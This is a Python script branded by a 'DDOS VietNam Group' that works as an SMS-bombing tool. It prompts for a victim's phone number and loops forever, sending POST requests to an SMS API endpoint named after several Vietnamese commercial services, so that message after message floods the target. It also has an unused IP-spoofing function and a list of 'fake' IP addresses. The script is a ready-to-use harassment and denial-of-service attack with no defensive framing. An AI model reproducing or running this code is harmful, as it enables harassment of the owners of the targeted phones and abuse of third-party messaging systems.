'''Bản quyền: https://www.youtube.com/c/L%C3%AAQuanggMinhhOfficial'''
from time import sleep
import requests
import os, sys, requests, random
import time
from random import choice, randint, shuffle
try:
  from pystyle import Center, Anime, Colors, Colorate
except:
  os.system('pip install pystyle')



#spoof
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
#fake_ip
fake_ip = '103.74.121.46'
fake_ip = '14.248.80.77'
fake_ip = '113.161.59.136'
fake_ip = '14.241.225.179'
fake_ip = '14.162.146.186'
fake_ip = '113.160.182.236'
fake_ip = '112.137.142.8'
fake_ip = '51.105.46.78'
fake_ip = '112.137.142.8'
fake_ip = '14.162.146.186'
fake_ip = '50.219.7.214'
fake_ip = '50.219.7.213'
fake_ip = '222.252.3.2'
fake_ip = '113.160.247.27'
os.system("cls" if os.name == "nt" else "clear")
print( 'DDDDDDDDDDDDD       VVVVVVVV           VVVVVVVV       GGGGGGGGGGGGG')
print( 'D::::::::::::DDD    V::::::V           V::::::V    GGG::::::::::::G')
print( 'D:::::::::::::::DD  V::::::V           V::::::V  GG:::::::::::::::G')
print( 'DDD:::::DDDDD:::::D V::::::V           V::::::V G:::::GGGGGGGG::::G')
print( '  D:::::D    D:::::D V:::::V           V:::::V G:::::G       GGGGGG')
print( '  D:::::D     D:::::D V:::::V         V:::::V G:::::G              ')
print( '  D:::::D     D:::::D  V:::::V       V:::::V  G:::::G              ')
print( '  D:::::D     D:::::D   V:::::V     V:::::V   G:::::G    GGGGGGGGGG')
print( '  D:::::D     D:::::D    V:::::V   V:::::V    G:::::G    G::::::::G')
print( '  D:::::D     D:::::D     V:::::V V:::::V     G:::::G    GGGGG::::G')
print( '  D:::::D     D:::::D      V:::::V:::::V      G:::::G        G::::G')
print( '  D:::::D    D:::::D        V:::::::::V        G:::::G       G::::G')
print( 'DDD:::::DDDDD:::::D          V:::::::V          G:::::GGGGGGGG::::G')
print( 'D:::::::::::::::DD            V:::::V            GG:::::::::::::::G')
print( 'D::::::::::::DDD               V:::V               GGG::::::GGG:::G')
print( 'DDDDDDDDDDDDD                   VVV                   GGGGGG   GGGG' )
print(" ")
print(" ")
print( '   _____          _         _                          _______       ___  ')
print( '  / ____|        | |       | |                /\      |__   __|     |__ \ ')
print( ' | |     ___   __| | ___   | |__  _   _      /  \   _ __ | |_ __ ___   ) |')
print( ' | |    / _ \ / _` |/ _ \  | \'_ \| | | |    / /\ \ | \'_ \| | \'__/ __| / / ')
print( ' | |___| (_) | (_| |  __/  | |_) | |_| |   / ____ \| | | | | | | (__ / /_ ')
print( '  \_____\___/ \__,_|\___|  |_.__/ \__, |  /_/    \_\_| |_|_|_|  \___|____|')
print( '                                  __/ |                                 ')
print( '                                 |___/                                  ' )
print( 'Group: DDOS VietNam Group (DVG)')
print( 'Link: https://www.facebook.com/groups/776821276786175')
print( ' ')
print( " ")

sdt=input(str('\033[1;33mSo Dien Thoai: '))
time_delay = random.randint(0,1)
print('\033[1;97m===========================================================================')
stt=0
while True:
    stt+=1
    string=requests.post(f'https://api-sms-v2.herokuapp.com/nhap-hang-247?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/elines?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/meta-vn?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/bach-hoa-xanh?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/grab-food?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/tiki?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/gojoy?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/vntrip?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/the-gioi-di-dong?phone={sdt}').text
    print(f'\033[1;97m[{stt}]\033[1;96m Gui tin nhan den\033[1;94m-\033[1;94m{sdt}\033[1;94m-\033[1;96m thanh cong!')
    for a in range(time_delay,0,-1):
        print(f'Gui tin nhan tiep sau: {a} giay ', end='\r')
        sleep(1)
